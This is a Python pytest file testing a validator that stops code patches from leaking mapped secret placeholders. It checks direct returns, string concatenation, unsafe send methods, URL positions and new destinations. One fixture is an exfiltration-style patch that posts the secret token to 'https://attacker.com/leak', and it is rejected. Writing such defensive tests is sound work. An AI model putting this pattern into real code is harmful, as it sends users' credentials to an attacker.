import pytest
from kintsugi.privacy import (
    validate_patch_placeholder_safety,
    restore_mapped_secrets,
)


def test_safe_sink_method_call_allowed():
    orig_source = """
def fetch_data(client, url):
    return client.post(url, headers={"Authorization": "Bearer sk-1234567890abcdef1234567890"})
"""
    patch_code = """
def fetch_data(client, url):
    return client.post(url, headers={"Authorization": f"Bearer {__KINTSUGI_SECRET_0__}"})
"""
    secret_map = {"__KINTSUGI_SECRET_0__": "sk-1234567890abcdef1234567890"}

    # Must pass validation without error
    validate_patch_placeholder_safety(patch_code, orig_source, secret_map)
    restored = restore_mapped_secrets(patch_code, secret_map, original_source=orig_source)
    assert "sk-1234567890abcdef1234567890" in restored


def test_placeholder_direct_return_rejected():
    orig_source = 'def get_key(): return "sk-1234567890abcdef1234567890"'
    patch_code = 'def get_key(): return __KINTSUGI_SECRET_0__'
    secret_map = {"__KINTSUGI_SECRET_0__": "sk-1234567890abcdef1234567890"}

    with pytest.raises(ValueError, match="Secret placeholder returned directly"):
        validate_patch_placeholder_safety(patch_code, orig_source, secret_map)


def test_placeholder_string_concatenation_rejected():
    orig_source = 'def get_auth(): key = "sk-1234567890abcdef1234567890"'
    patch_code = 'def get_auth(): return "key=" + __KINTSUGI_SECRET_0__'
    secret_map = {"__KINTSUGI_SECRET_0__": "sk-1234567890abcdef1234567890"}

    with pytest.raises(ValueError, match="Binary operation string concatenation with secret placeholder"):
        validate_patch_placeholder_safety(patch_code, orig_source, secret_map)


def test_request_and_send_methods_rejected_for_placeholder():
    orig_source = 'def sync(session): session.request("POST", "http://api.com")'
    secret_map = {"__KINTSUGI_SECRET_0__": "sk-1234567890abcdef1234567890"}

    # session.request with placeholder is rejected
    patch_request = 'def sync(session): session.request("POST", "http://api.com", token=__KINTSUGI_SECRET_0__)'
    with pytest.raises(ValueError, match="Method 'request' is not an authorized safe sink"):
        validate_patch_placeholder_safety(patch_request, orig_source, secret_map)

    # client.send with placeholder is rejected
    patch_send = 'def sync(client): client.send(__KINTSUGI_SECRET_0__)'
    with pytest.raises(ValueError, match="Method 'send' is not an authorized safe sink"):
        validate_patch_placeholder_safety(patch_send, orig_source, secret_map)


def test_placeholder_in_url_position_rejected():
    orig_source = 'def post_data(client): client.post("http://api.com", data=1)'
    secret_map = {"__KINTSUGI_SECRET_0__": "sk-1234567890abcdef1234567890"}

    # In args[0]
    patch_args0 = 'def post_data(client): client.post(__KINTSUGI_SECRET_0__, data=1)'
    with pytest.raises(ValueError, match="Secret placeholder placed in URL destination position"):
        validate_patch_placeholder_safety(patch_args0, orig_source, secret_map)

    # In kw.arg == 'url'
    patch_kw_url = 'def post_data(client): client.post(url=__KINTSUGI_SECRET_0__, data=1)'
    with pytest.raises(ValueError, match="Secret placeholder placed in 'url' destination argument"):
        validate_patch_placeholder_safety(patch_kw_url, orig_source, secret_map)


def test_untrusted_destination_url_introduced_rejected():
    orig_source = 'def fetch(client): client.post("https://api.internal/v1", headers={})'
    secret_map = {"__KINTSUGI_SECRET_0__": "sk-1234567890abcdef1234567890"}

    # Patch tries to redirect to https://attacker.com
    patch_attacker = 'def fetch(client): client.post("https://attacker.com/leak", headers={"token": __KINTSUGI_SECRET_0__})'
    with pytest.raises(ValueError, match="Untrusted destination URL 'https://attacker.com/leak' introduced"):
        validate_patch_placeholder_safety(patch_attacker, orig_source, secret_map)
